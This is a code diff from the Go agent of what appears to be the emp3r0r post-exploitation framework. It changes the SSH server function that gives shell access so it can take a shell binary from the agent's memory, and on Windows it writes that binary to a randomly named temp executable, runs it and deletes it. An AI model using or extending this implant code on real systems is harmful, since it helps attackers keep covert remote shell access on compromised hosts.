@@ -7,12 +7,14 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"os/exec"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/jm33-m0/go-console"
@@ -22,11 +24,32 @@ import (
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func crossPlatformSSHD(shell, port string, args []string) (err error) {
-	exe, e := exec.LookPath(shell)
-	if e != nil {
-		e = fmt.Errorf("%s not found (%v)", shell, e)
-		logging.Print(e)
-		return
+	// shell from memory
+	var exe string
+	isMemShell := strings.HasPrefix(shell, "mem:") || strings.HasPrefix(shell, "mem://")
+	if isMemShell {
+		shellData, err := util.ReadFileAgent(shell)
+		if err != nil {
+			logging.Printf("sshd: read shell %s from memory: %v", shell, err)
+			return err
+		}
+		// on Windows we don't have a memory execution loader for EXEs yet
+		// so we write it to a temp file and run it
+		tempExe := fmt.Sprintf("%s/%s.exe", os.TempDir(), util.RandMD5String())
+		err = util.WriteFileAgent(tempExe, shellData, 0755)
+		if err != nil {
+			logging.Printf("sshd: write temp shell %s: %v", tempExe, err)
+			return err
+		}
+		exe = tempExe
+		defer os.Remove(tempExe)
+	} else {
+		exe, err = exec.LookPath(shell)
+		if err != nil {
+			err = fmt.Errorf("%s not found (%v)", shell, err)
+			logging.Print(err)
+			return err
+		}
 	}
 
 	// ssh server
